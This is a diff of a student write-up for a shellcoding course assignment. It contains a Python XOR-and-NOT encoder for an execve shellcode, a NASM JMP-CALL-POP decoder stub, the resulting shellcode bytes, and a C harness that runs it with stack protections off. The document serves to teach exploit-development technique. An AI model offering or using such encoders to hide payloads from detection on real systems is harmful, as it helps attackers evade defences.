@@ -3,15 +3,22 @@ This course can be found here:
 [Link to course](https://www.pentesteracademy.com/course?id=3)
 
 ## Assignment#4: What to do ?
+For this assignment we have to:
 * Create a custom encoding scheme 
 
 Now, let's get to work.
 =
 
-## Python encoder:
+ <div style="text-align: justify"> To do this task, I have chosen to use a two step encoding schema. The python code, used for this task, will run through the shellcode provided inside the 'shellcode' variable and then apply its routine on each bit. </div>
+
+As said before, the shellcode will be encoded in two steps:
+1) Each bit will be XOR with the 0xAA bit,
+2) Then a NOT operation will be done
+
+Below is the python code used to encode the shellcode:
 ```python
 #!/usr/bin/python3
-# Python XOR and NOT bits encoders
+# Python XOR and NOT encoder
 
 # The shellcode used is a basic systemcall to execve
 shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
@@ -21,8 +28,6 @@ print('Shellcode len: {}'.format(len(shellcode)))
 print('Encoded shellcode ...')
 
 # Encode the shellcode in two steps:
-# First, use a XOR encoder
-# Then, use a NOT encoder
 for x in bytearray(shellcode):
 	# XOR encoder part
 	# 0xAA is the Byte used to encode
@@ -32,20 +37,26 @@ for x in bytearray(shellcode):
 	y = ~y
 	encoded_shellcode += '{},'.format(hex(y & 0xFF))
 
-# Remove minus sign created by the NOT encoder
-encoded_shellcode = encoded_shellcode.replace('-','')
 # Print an encoded shellcode format
 print(encoded_shellcode)
 ```
-## Console logs:
+Here is the results from the python encoder:
 ```console
-#./encoder.py
+#python3 encoder.py
 Shellcode len: 30
 Encoded shellcode ...
 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
 ```
 
-## The assembly decoder:
+The 'decoder.nasm' file use the famous JUMP-CALL-POP technique to avoid NULL BYTES.
+
+To make it simple:
+1) <div style="text-align: justify"> The JUMP PART of the assembly code will first initialize ecx to NULL then move the length of the shellcode inside cl. It will finally jump inside the POP section. </div>
+2) The CALL PART will call the 'stage2' of the code by jumping to it and push the 'shellcode' variable on the stack
+3) <div style="text-align: justify"> The POP PART will simply pop the 'shellcode' variable inside esi and let the execution continues. The decoding process can start by using the NOT and the XOR operations on each bit of the shellcode. </div>
+4) Finally, we jump in and execute the decoded shellcode 
+
+Below is the assembly code used to decode our shellcode then execute it:
 ```nasm
 ;A simple NOT and XOR decoder
 ;Using the JUMP-CALL-POP method
@@ -78,7 +89,8 @@ stage1:
     shellcode: db 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
     shellcodeLen: equ $-shellcode   ;This lign is used to get the shellcode length
 ```
-## Console logs:
+
+Let's compile it and get the shellcode from 'decoder.nasm':
 ```console
 #nasm -f elf32 -o decoder.o decoder.nasm
 #ld -m elf_i386 -z execstack -o decoder decoder.o
@@ -87,28 +99,28 @@ stage1:
 "\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5"
 ```
 
-## The C code used to test the decoder:
+We can now add the newly generated shellcode to the following C code:
 ```c
 #include <stdio.h>
 #include <string.h>
 
 // decoder.nasm shellcode is stored here
-unsigned char code[] = \
+unsigned char shellcode[] = \
 "\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5";
 
-main()
+int main()
 {
 	// print the length of the shellcode
-	printf("Shellcode Length:  %d\n", strlen(code));
+	printf("Shellcode Length:  %d\n", strlen(shellcode));
 	// convert shellcode to a function
-	int (*ret)() = (int(*)())code;
+	int (*ret)() = (int(*)())shellcode;
 	// execute the shellcode has a function
 	ret();
 
 }
 ```
 
-## Console logs:
+let's compile and execute it:
 ```console
 #gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
 #./test_shellcode
